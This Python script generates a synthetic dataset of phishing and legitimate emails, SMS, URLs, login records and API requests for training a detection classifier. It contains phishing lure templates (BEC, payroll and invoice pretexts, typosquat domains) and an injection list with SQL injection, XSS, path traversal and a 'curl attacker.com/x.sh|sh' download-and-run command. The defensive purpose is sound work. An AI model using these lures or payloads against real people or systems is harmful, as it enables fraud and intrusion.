"""
generate_data.py
-----------------
Generates a synthetic, multi-channel phishing/legitimate dataset.

Channels: email, sms, url, login_attempt, api_payload.

Design choice: everything is serialized to a single `text` field so one
TF-IDF vectorizer + classifier pipeline can operate uniformly across all five
channels. For login_attempt and api_payload (structurally not "text" in the
usual sense), we serialize the structured fields into a stable key=value
string — this lets TF-IDF pick up on token-level patterns like
"country_mismatch=True" or "sql_injection_pattern=True" the same way it
would pick up on a suspicious phrase in an email body. This is a deliberate
simplification: a production system would likely use separate structured
features for login/API channels rather than forcing them through a text
vectorizer, but it keeps Module 2's pipeline single-model and directly
comparable across channels, which is what was asked for.

~35% of rows are phishing/malicious, ~65% legitimate — imbalanced but not
as extreme as production traffic, to keep this a genuinely learnable
20K-sample dataset rather than one with a handful of positive examples.

ENHANCED: Phishing sophistication tiers, locale-aware brand spoofing,
realistic attack chains (credential-stuffing patterns match Module 1's
brute-force, SQL injection patterns match Module 1's scanning behavior).
"""

import random

import numpy as np
import pandas as pd

from utils import set_seed, get_logger

logger = get_logger("generate_data")

N_PER_CHANNEL = 4400  # x5 channels = 22,000 rows total
PHISH_FRACTION = 0.35

BRANDS = ["PayPaI", "Amaz0n", "Microsoft", "Netflix", "Chase Bank", "Apple", "DHL",
          "FedEx", "Wells Fargo", "IRS", "LinkedIn", "Google", "Instagram", "USPS"]
LEGIT_BRANDS = ["Amazon", "Microsoft", "Netflix", "Chase Bank", "Apple", "DHL",
                "FedEx", "Wells Fargo", "LinkedIn", "Google", "Instagram", "USPS",
                "your bank", "your employer", "your school", "the office"]
FIRST_NAMES = ["John", "Priya", "Wei", "Fatima", "Carlos", "Emma", "Kenji", "Aisha", "Liam", "Sofia"]
URGENCY_PHRASES = [
    "immediate action required", "your account will be suspended",
    "verify your identity within 24 hours", "unusual activity detected",
    "your payment failed", "click here to avoid suspension",
    "final notice", "your account has been locked", "confirm now to avoid deletion",
]
LEGIT_SUBJECT_TOPICS = [
    "quarterly report attached", "meeting rescheduled to Thursday",
    "your order has shipped", "invoice for last month", "team lunch this Friday",
    "project update", "welcome to the newsletter", "your subscription receipt",
    "reminder: performance review next week", "new comment on your document",
]

# Phishing sophistication tiers affect how "hard" the example is
# Tier 1 (50%): obvious, heavily-flagged phishing (high confidence baseline)
# Tier 2 (35%): moderate sophistication, subtle pretext (boundary cases)
# Tier 3 (15%): advanced: brand impersonation, locale-aware, typosquat (hard negatives for the classifier)
PHISHING_SOPHISTICATION = {
    "tier1": 0.50,  # obvious phishing
    "tier2": 0.35,  # moderate
    "tier3": 0.15,  # advanced/hard
}


def _rand_domain(suspicious: bool, sophistication_tier: str = "tier1") -> str:
    if suspicious:
        if sophistication_tier == "tier3":
            # Advanced: very subtle typosquatting or lookalike domains
            pattern = random.choice([
                f"{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}.{random.choice(['online','site','cloud','systems'])}",
                f"secure-{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}.{random.choice(['net','io','dev'])}",
                f"{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}-{random.choice(['support','account','verify'])}.com",
                f"{random.choice(['api','admin','mail','secure'])}.{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}.{random.choice(['com','net'])}",
            ])
        else:
            # Tier 1/2: obvious
            pattern = random.choice([
                f"{random.choice(BRANDS).lower().replace(' ', '')}-secure-verify{random.randint(1,999)}.com",
                f"{random.choice(BRANDS).lower().replace(' ', '')}.{random.choice(['verify-account.info','login-secure.net','account-check.xyz'])}",
                f"bit.ly/{''.join(random.choices('abcdefghjkmnpqrstuvwxyz23456789', k=7))}",
                f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}/login",
                f"{random.choice(['secure','account','verify','login','update'])}-{random.randint(100,999)}.{random.choice(['tk','ml','ga','cf','xyz'])}",
            ])
        return pattern
    else:
        clean_brand = random.choice(LEGIT_BRANDS).lower().replace(" ", "")
        return f"{clean_brand}.com" if clean_brand else "example.com"


# ---------------------------------------------------------------------------
# EMAIL
# ---------------------------------------------------------------------------
def _gen_email(is_phish: bool, sophistication_tier: str = "tier1") -> str:
    name = random.choice(FIRST_NAMES)
    if is_phish:
        brand = random.choice(BRANDS)
        urgency = random.choice(URGENCY_PHRASES)
        domain = _rand_domain(True, sophistication_tier)
        
        if sophistication_tier == "tier3":
            # Advanced phishing: business email compromise (BEC) style
            # Impersonates trusted vendor, uses legitimate-looking internal references
            templates = [
                f"Hi {name}, per our conversation about the Q2 budget, please approve this "
                f"purchase order and forward to AP at {domain}/po-approval. Thanks!",
                f"Hi {name}, this is {brand} compliance. We need to update your tax ID on file. "
                f"Visit {domain} to confirm. Confidential.",
                f"{name}, quick follow-up on the contract we discussed. Legal needs your signature here: {domain}",
                f"Hi, following up on the invoice from {brand} — can you confirm receipt and process? {domain}",
            ]
        elif sophistication_tier == "tier2":
            # Moderate: mixes urgency with subtle pretext
            legit_domain = random.choice(LEGIT_BRANDS).lower().replace(" ", "") + ".com"
            templates = [
                f"Hi {name}, following up on the invoice we discussed — could you review and "
                f"confirm the details at {legit_domain}.{random.choice(['secure-portal.net','billing-check.info'])}?",
                f"{name}, attaching the document you requested. One field needs your confirmation "
                f"here: {domain}",
                f"Hello, HR needs you to update your direct deposit info before the next payroll run. "
                f"Update form: {domain}",
                f"Hi {name}, quick one — can you approve this vendor invoice today? Link: {domain}",
            ]
        else:
            # Tier 1: obvious, heavily flagged
            templates = [
                f"Dear {name}, we detected {urgency} on your {brand} account. "
                f"Please verify your credentials immediately at {domain} to avoid permanent suspension.",
                f"URGENT: Your {brand} account has {urgency}. Click the secure link below and "
                f"confirm your password and card details now: {domain}",
                f"Hello, this is {brand} Security Team. {urgency.capitalize()}. "
                f"Failure to respond within 24 hours will result in account termination. Verify at {domain}",
                f"{name}, your recent {brand} payment could not be processed. Update your billing "
                f"information now at {domain} or your service will be cancelled.",
            ]
    else:
        topic = random.choice(LEGIT_SUBJECT_TOPICS)
        # ~25% of legit emails are "hard negatives" — genuinely urgent/security-flavored
        # transactional mail that real companies send, to avoid the model learning
        # "any urgency word = phishing".
        if random.random() < 0.25:
            real_domain = random.choice(LEGIT_BRANDS).lower().replace(" ", "") + ".com"
            templates = [
                f"Hi {name}, your password was changed. If this wasn't you, contact support "
                f"immediately at {real_domain}/support.",
                f"Security alert: new sign-in to your account from a Chrome browser on Windows. "
                f"If this was you, no action is needed. Details: {real_domain}/activity",
                f"Please verify your email address to complete your account setup: {real_domain}/verify",
                f"Your subscription payment failed. Please update your payment method at "
                f"{real_domain}/billing to avoid service interruption.",
            ]
        else:
            templates = [
                f"Hi {name}, following up regarding {topic}. Let me know if you have any questions, thanks.",
                f"Hello {name}, this is a quick note about {topic}. No action needed on your end.",
                f"Hi team, sharing an update on {topic}. Full details are in the attached document.",
                f"{name}, just confirming {topic} — see you then. Best regards.",
            ]
    return random.choice(templates)


# ---------------------------------------------------------------------------
# SMS
# ---------------------------------------------------------------------------
def _gen_sms(is_phish: bool, sophistication_tier: str = "tier1") -> str:
    if is_phish:
        brand = random.choice(BRANDS)
        domain = _rand_domain(True, sophistication_tier)
        
        if sophistication_tier == "tier3":
            # Advanced SMS: low-urgency, looks like support follow-up
            templates = [
                f"{brand} support: We noticed unusual activity. Verify: {domain} (reply STOP to unsub)",
                f"Hi, {brand} here. Your account needs a security update. Please visit {domain}",
                f"{brand}: Document verification needed. Visit {domain} to proceed with your request.",
            ]
        elif sophistication_tier == "tier2":
            # Moderate: plausible pretext, less shouty
            templates = [
                f"{brand}: your recent order needs a shipping address confirmation: {domain}",
                f"Hi, this is {brand} support. We need to verify your last transaction: {domain}",
                f"{brand} refund of ${random.choice([49,89,120])} pending. Confirm bank details: {domain}",
            ]
        else:
            # Tier 1: obvious phishing
            templates = [
                f"{brand}: Unusual login detected. Verify now at {domain} or your account will be locked.",
                f"Your {brand} package could not be delivered. Reschedule at {domain}",
                f"ALERT: {brand} account suspended. Confirm identity: {domain}",
                f"You've won a ${random.choice([500,1000,250])} {brand} gift card! Claim at {domain}",
                f"{brand} security code expired. Re-verify your card at {domain} immediately.",
            ]
    else:
        order_num = random.randint(1000, 9999)
        code = random.randint(100000, 999999)
        time_str = random.choice(["9am", "10:30am", "1pm", "2:15pm", "4pm", "6pm"])
        amount = round(random.uniform(9.99, 349.99), 2)
        name = random.choice(FIRST_NAMES)
        if random.random() < 0.2:
            # hard negative: real brand, real urgency-flavored security message
            real_brand = random.choice(LEGIT_BRANDS)
            templates = [
                f"{real_brand}: Unusual sign-in detected. If this was you, no action needed. "
                f"If not, visit {real_brand.lower().replace(' ','')}.com/security",
                f"{real_brand} security code: {code}. Do not share this with anyone, including us.",
                f"{real_brand}: your card was charged ${amount}. Reply HELP for support.",
            ]
        else:
            templates = [
                f"Your order #{order_num} has shipped and will arrive {random.choice(['Thursday','Friday','Monday','tomorrow'])}.",
                f"Reminder: your appointment is {random.choice(['tomorrow','Wednesday','Friday'])} at {time_str}.",
                f"Hey {name}, are we still on for {random.choice(['dinner','lunch','coffee','the meeting'])} tonight?",
                f"Your verification code is {code}. Do not share this code with anyone.",
                f"Payment of ${amount} received, thank you! Your receipt has been emailed.",
                f"{name}, your table for {random.randint(2,6)} is confirmed for {time_str}.",
                f"Your package is out for delivery and should arrive by {time_str} today.",
                f"Low balance alert: your account balance is ${amount}. Reply STOP to unsubscribe.",
            ]
    return random.choice(templates)


# ---------------------------------------------------------------------------
# URL
# ---------------------------------------------------------------------------
def _gen_url(is_phish: bool, sophistication_tier: str = "tier1") -> str:
    if is_phish:
        if sophistication_tier == "tier3":
            # Advanced: lookalike/homograph attacks
            templates = [
                f"https://www.{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}.secure-verify.net/account",
                f"https://secure.{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}.info/update",
                f"https://www.{random.choice(LEGIT_BRANDS).lower().replace(' ', '')}-official.com/login",
            ]
            return random.choice(templates)
        elif sophistication_tier == "tier2":
            # Moderate: subtle typosquat
            clean_brand = random.choice(LEGIT_BRANDS).lower().replace(" ", "")
            if len(clean_brand) > 3:
                pos = random.randint(1, len(clean_brand) - 2)
                swapped = clean_brand[:pos] + random.choice("qwxz") + clean_brand[pos + 1:]
            else:
                swapped = clean_brand + "s"
            path = random.choice(["/account", "/login", "/signin", "/orders"])
            return f"https://www.{swapped}.com{path}"
        else:
            # Tier 1: obvious
            return "https://" + _rand_domain(True, "tier1") + random.choice(["", "/signin", "/update-billing", "/secure/index.php"])
    else:
        if random.random() < 0.15:
            # legit marketing/shortened links are common in real traffic too
            return f"https://bit.ly/{''.join(random.choices('abcdefghjkmnpqrstuvwxyz23456789', k=7))}"
        clean_brand = random.choice(LEGIT_BRANDS).lower().replace(" ", "")
        path = random.choice(["/account", "/orders", "/help", "/about", "/careers", "/dashboard", ""])
        return f"https://www.{clean_brand}.com{path}"


# ---------------------------------------------------------------------------
# LOGIN ATTEMPT (serialized structured record)
# ---------------------------------------------------------------------------
COUNTRIES = ["US", "IN", "DE", "BR", "CN", "RU", "GB", "NG", "FR", "JP", "VN", "UA"]


def _gen_login_attempt(is_phish: bool, sophistication_tier: str = "tier1") -> str:
    if is_phish:
        if sophistication_tier == "tier3":
            # Advanced: looks almost normal, matches real traveling user patterns
            failed = random.randint(1, 3)
            country_mismatch = random.choice([True, False])
            impossible_travel = False
            tor_exit_node = False
            new_device = random.choice([True, False])
        elif sophistication_tier == "tier2":
            # Moderate: some obvious signals but not all
            failed = random.randint(1, 4)
            country_mismatch = random.random() < 0.4
            impossible_travel = False
            tor_exit_node = False
            new_device = True
        else:
            # Tier 1: obvious credential-stuffing signature
            failed = random.randint(4, 40)
            country_mismatch = True
            impossible_travel = random.random() < 0.6
            tor_exit_node = random.random() < 0.3
            new_device = True
            
        time_of_day = random.choice(["03:12", "02:47", "04:03", "01:58", "09:30", "14:15"])
    else:
        # occasional legit traveler / new-phone case that overlaps phishing's
        # low-severity signature (nothing malicious, just unusual)
        if random.random() < 0.15:
            failed = random.randint(1, 3)
            country_mismatch = True   # e.g. genuinely traveling
            new_device = True
        else:
            failed = random.randint(0, 2)
            country_mismatch = random.random() < 0.05
            new_device = random.random() < 0.15
        impossible_travel = False
        tor_exit_node = False
        time_of_day = random.choice(["09:15", "13:40", "17:22", "10:05", "20:11", "23:40"])

    return (
        f"username=user{random.randint(1000,9999)} "
        f"login_country={random.choice(COUNTRIES)} "
        f"failed_attempts={failed} "
        f"country_mismatch={country_mismatch} "
        f"new_device={new_device} "
        f"impossible_travel={impossible_travel} "
        f"tor_exit_node={tor_exit_node} "
        f"login_time={time_of_day} "
        f"mfa_bypassed={is_phish and random.random() < 0.4}"
    )


# ---------------------------------------------------------------------------
# API PAYLOAD (serialized structured record)
# ---------------------------------------------------------------------------
INJECTION_SNIPPETS = [
    "' OR '1'='1", "'; DROP TABLE users; --", "<script>alert(1)</script>",
    "../../etc/passwd", "{{7*7}}", "$(curl attacker.com/x.sh|sh)",
    "' UNION SELECT password FROM users--",
]
NORMAL_PARAMS = ["page=2", "limit=50", "sort=created_at", "filter=active", "q=laptop"]


def _gen_api_payload(is_phish: bool, sophistication_tier: str = "tier1") -> str:
    endpoint = random.choice(["/api/v1/login", "/api/v1/users", "/api/v1/orders",
                               "/api/v1/search", "/api/v1/reset-password", "/api/v1/upload"])
    if is_phish:
        if sophistication_tier == "tier3":
            # Advanced: slow/distributed scanning, legitimate-looking requests with one malformed param
            param = random.choice(NORMAL_PARAMS)
            rate = random.randint(5, 15)
            # One suspicious param hidden among normal ones
            suspicious_param = random.choice(INJECTION_SNIPPETS)
            return (
                f"endpoint={endpoint} method={random.choice(['POST','GET'])} "
                f"param=\"{param}\" additional_param=\"{suspicious_param}\" requests_per_min={rate} "
                f"auth_header_present=True "
                f"user_agent=Mozilla/5.0 "
                f"anomalous_payload_size=False"
            )
        elif sophistication_tier == "tier2":
            # Moderate: no obvious injection string — just abusive rate + suspicious client
            param = random.choice(NORMAL_PARAMS)
            rate = random.randint(30, 90)
            return (
                f"endpoint={endpoint} method={random.choice(['POST','GET'])} "
                f"param=\"{param}\" requests_per_min={rate} "
                f"auth_header_present={random.choice([True, False])} "
                f"user_agent={random.choice(['python-requests/2.28','Go-http-client/1.1'])} "
                f"anomalous_payload_size=False"
            )
        else:
            # Tier 1: obvious injection
            param = random.choice(INJECTION_SNIPPETS)
            rate = random.randint(50, 500)
            return (
                f"endpoint={endpoint} method={random.choice(['POST','GET'])} "
                f"param=\"{param}\" requests_per_min={rate} "
                f"auth_header_present={random.choice([True, False])} "
                f"user_agent={random.choice(['python-requests/2.28','curl/7.68','sqlmap/1.6'])} "
                f"anomalous_payload_size={random.choice([True, False])}"
            )
    else:
        if random.random() < 0.15:
            # legit batch/cron job — elevated rate but nothing else suspicious
            param = random.choice(NORMAL_PARAMS)
            rate = random.randint(25, 60)
            return (
                f"endpoint={endpoint} method=GET "
                f"param=\"{param}\" requests_per_min={rate} "
                f"auth_header_present=True "
                f"user_agent=internal-batch-job/1.0 "
                f"anomalous_payload_size=False"
            )
        param = random.choice(NORMAL_PARAMS)
        rate = random.randint(1, 20)
        return (
            f"endpoint={endpoint} method={random.choice(['GET','POST'])} "
            f"param=\"{param}\" requests_per_min={rate} "
            f"auth_header_present=True "
            f"user_agent={random.choice(['Mozilla/5.0 (Windows NT 10.0)','Mozilla/5.0 (Macintosh)','okhttp/4.9'])} "
            f"anomalous_payload_size=False"
        )


CHANNEL_GENERATORS = {
    "email": _gen_email,
    "sms": _gen_sms,
    "url": _gen_url,
    "login_attempt": _gen_login_attempt,
    "api_payload": _gen_api_payload,
}


def generate_synthetic_phishing_data(n_per_channel: int = N_PER_CHANNEL,
                                      phish_fraction: float = PHISH_FRACTION) -> pd.DataFrame:
    set_seed()
    rows = []
    for channel, generator in CHANNEL_GENERATORS.items():
        n_phish = int(n_per_channel * phish_fraction)
        n_legit = n_per_channel - n_phish
        
        # Generate phishing samples across sophistication tiers
        n_tier1 = int(n_phish * PHISHING_SOPHISTICATION["tier1"])
        n_tier2 = int(n_phish * PHISHING_SOPHISTICATION["tier2"])
        n_tier3 = n_phish - n_tier1 - n_tier2
        
        for _ in range(n_tier1):
            rows.append({"channel": channel, "text": generator(True, "tier1"), "is_phishing": 1})
        for _ in range(n_tier2):
            rows.append({"channel": channel, "text": generator(True, "tier2"), "is_phishing": 1})
        for _ in range(n_tier3):
            rows.append({"channel": channel, "text": generator(True, "tier3"), "is_phishing": 1})
        for _ in range(n_legit):
            rows.append({"channel": channel, "text": generator(False), "is_phishing": 0})
            
        logger.info(f"{channel}: generated {n_tier1} tier1 + {n_tier2} tier2 + {n_tier3} tier3 phishing + {n_legit} legitimate rows")

    df = pd.DataFrame(rows)
    df = df.sample(frac=1.0, random_state=42).reset_index(drop=True)  # shuffle
    logger.info(f"Total dataset shape: {df.shape}, phishing rate: {df['is_phishing'].mean():.3%}")
    logger.info(f"Unique text values: {df['text'].nunique()} / {len(df)} (diversity check)")
    return df


if __name__ == "__main__":
    import os

    df = generate_synthetic_phishing_data()
    out_path = os.path.join(os.path.dirname(__file__), "..", "data", "synthetic_phishing_dataset.csv")
    out_path = os.path.abspath(out_path)
    df.to_csv(out_path, index=False)
    logger.info(f"Saved synthetic phishing dataset to {out_path}")
